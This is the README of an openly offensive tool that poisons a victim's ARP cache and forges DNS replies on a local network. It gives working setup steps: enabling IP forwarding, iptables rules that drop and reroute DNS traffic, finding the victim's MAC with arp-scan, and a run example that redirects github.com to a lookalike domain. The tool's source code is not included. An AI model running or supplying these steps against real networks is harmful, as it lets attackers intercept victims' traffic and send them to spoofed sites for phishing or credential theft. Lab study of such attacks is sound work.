# DNS Spoofer

DNS Spoofer is a tool which exploits how ARP protocol works by pretending to be the gateway. Then when victim saves attacker's MAC as gateway
all packets will be tunneled through attacker's computer. This allows attacker to pick DNS packets, drop them and inject fake DNS responses.

## Prerequisites

Install required packages. Commands below are for Arch Linux. If you are using a different distro then you will need to find packages on your own.

```sh
pacman -S libpcap-devel
pacman -S libnet-devel
```

## How to run

### 1. Enable ip forwarding

```sh
echo "1" | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 2. Add routing via iptables

These commands will make that all packets are passed to the router except for DNS requests.
Second command is needed because without it DNS responses would be masqueraded too and victim would not
accept them.

```sh
sudo iptables -t filter -A FORWARD -p udp --dport 53 -j DROP
sudo iptables -t nat -A POSTROUTING -o wlo1 -p udp --sport 53 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o wlo1 -j MASQUERADE
```

### 3. Compile

```sh
make
```

### 4. Run

```sh
sudo ./dns_spoofer INTERFACE_NAME GATEWAY_IP_ADDR WEBSITE_ADDR REDIRECT_IP_ADDR VICTIMS_MAC
```

If you are not sure which interface to use, run "ip a" and look for the one that has "state UP".

To get victim's mac address, run "arp-scan --localnet".

#### Example:

If your interface is wlo1, gateway is 192.168.0.1 and victim's MAC is a8:44:12:13:g2:1b then you can run the following command:

```sh
sudo ./dns_spoofer wlo1 192.168.0.1 github.com guthib.com a8:44:12:13:g2:1b
```

This will make it so that when victim asks for ip address of github.com instead they will get ip address of guthib.com.
